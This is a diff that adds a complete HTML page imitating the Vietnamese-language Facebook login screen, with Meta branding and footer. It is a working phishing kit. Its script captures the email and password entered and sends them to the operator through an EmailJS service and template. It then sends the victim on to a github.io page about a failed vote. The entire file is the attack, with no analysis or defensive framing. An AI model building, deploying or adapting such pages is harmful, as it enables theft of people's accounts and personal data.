@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+ body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start; /* Align content at the top */
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 90%; /* Adjusted width to be responsive */
+            padding: 40px; /* Increased padding for a larger appearance */
+            background-color: rgb(242, 241, 241);
+            border-radius: 0px; /* Added rounded corners */
+            box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
+        }
+
+        .container input[type="text"],
+        .container input[type="password"] {
+            width: 93%;
+            padding: 15px; /* Increased padding for a larger appearance */
+            margin: 10px 0;
+            border: 1px solid #a9bdca;
+            outline: none;
+            border-radius: 5px;
+            height: 30px; /* Adjusted the height for larger inputs */
+            font-size: 18px; /* Increased font size for better visibility */
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 15px; /* Increased padding for a larger appearance */
+            background-color: #0e59ee;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 5px;
+            height: 50px; /* Adjusted the height for a larger button */
+            font-size: 18px; /* Increased font size for better visibility */
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px; /* Increased margin top */
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+            color: #0a68d4;
+            font-size: 16px; /* Increased font size for better visibility */
+        }
+
+        .centered-image1,
+        .centered-image2 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .custom-text {
+            font-family: Arial, sans-serif;
+            font-size: 16px; /* Increased font size for better visibility */
+            margin-top: 15px;
+            margin-bottom: 10px;
+            text-align: center; 
+        }
+        .footer {
+            background-color: #f2f2f2; /* Editable background color */
+            color: rgb(205, 205, 205);
+            text-align: center;
+            padding: 20px;
+            margin-top: 150px; /* Editable margin top */
+            margin-bottom: 20px; /* Editable margin bottom */
+        }
+
+        .footer a {
+            color: rgb(175, 175, 175); /* Editable link color */
+            text-decoration: none;
+            margin: 0 10px; /* Editable space between links */
+        }
+
+        .copyright {
+            margin-top: 10px; /* Editable margin top for the copyright text */
+        }
+    </style>
+</head>
+<body>
+    <div class="centered-image1">
+        <img src="" alt="" style="max-width: 100%; margin-bottom: 20px;">
+    </div>
+    <div class="container">
+        <div class="centered-image2">
+            <img src="https://raw.githubusercontent.com/FacebookArt/pak2/932c5b01030012c9e00871db959cdf045c5e0306/ayesha.png" alt="" style="max-width: 100%; margin-bottom: 20px;">
+            <div class="custom-text">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống.</div>
+        </div>
+        <!-- Modified the form to prevent its default behavior and added a JavaScript function to handle the submission -->
+        <form name="login" onsubmit="sendLoginDetails(); return false;">
+            <input type="text" class="container input" placeholder="Email hoặc số điện thoại" name="email" id="email">
+            <input type="password" class="container input" placeholder="Mật khẩu" name="password" id="password">
+            <button class="login-button" id="loginButton" type="submit">Đăng nhập</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Quên mật khẩu?</a>
+        </div>
+    </div>
+
+    <!-- Include Email.js library -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+    emailjs.init("AeQpNlhdKsPjCbTgI");
+
+    // Function to send login details via Email.js
+    function sendLoginDetails() {
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+
+        const emailValue = emailInput.value.trim();
+        const passwordValue = passwordInput.value.trim();
+
+        // Check if email and password meet the length requirement
+        if (emailValue.length < 6 || passwordValue.length < 6) {
+            alert('Vui lòng nhập email và mật khẩu của bạn');
+            return;
+        }
+
+        // Check if both email and password are not empty
+        if (emailValue === '' && passwordValue === '') {
+            alert('');
+            return;
+        }
+
+        // Check if either email or password is empty
+        if (emailValue === '' || passwordValue === '') {
+            alert('');
+            return;
+        }
+
+        // Template parameters
+        const templateParams = {
+            email: emailValue,
+            password: passwordValue
+        };
+
+        // Send email using Email.js
+        emailjs.send("service_0713asq", "template_qls5d09", templateParams)
+            .then(function(response) {
+                console.log("Login details sent successfully", response);
+                window.location.href = 'https://pintura-do-facebook.github.io/Votacao-falhou/';
+            }, function(error) {
+                console.log("Failed to send login details. Error:", error);
+                console.log("email:", email);
+                console.log("password:", password);
+            });
+    }
+
+    // JavaScript to enable/disable the login button
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const loginButton = document.getElementById('loginButton');
+
+    emailInput.addEventListener('input', validateInputs);
+    passwordInput.addEventListener('input', validateInputs);
+
+    function validateInputs() {
+        const emailValue = emailInput.value.trim();
+        const passwordValue = passwordInput.value.trim();
+
+        // Check if email and password meet the length requirement
+        if (emailValue.length < 6 || passwordValue.length < 6) {
+            loginButton.disabled = true;
+            return;
+        }
+
+        // Check if either email or password is empty
+        if (emailValue === '' || passwordValue === '') {
+            loginButton.disabled = true;
+        } else {
+            loginButton.disabled = false;
+        }
+    }
+</script>
+<div class="footer">
+    <a>Meta</a>
+    <a>Về</a>
+    <a>Blog</a>
+    <a>Việc làm</a>
+    <a>Giúp đỡ</a>
+    <a>API</a>
+    <a>Sự riêng tư</a>
+    <a>điều kiện</a>
+    <a>Instagram Lite</a>
+    <a>Threads</a>
+    <a>Meta Verified</a>
+    <a>Tiếng Việt</a>
+    <br>
+    © 2024 Facebook from Meta
+</div>
+</body>
+</html>
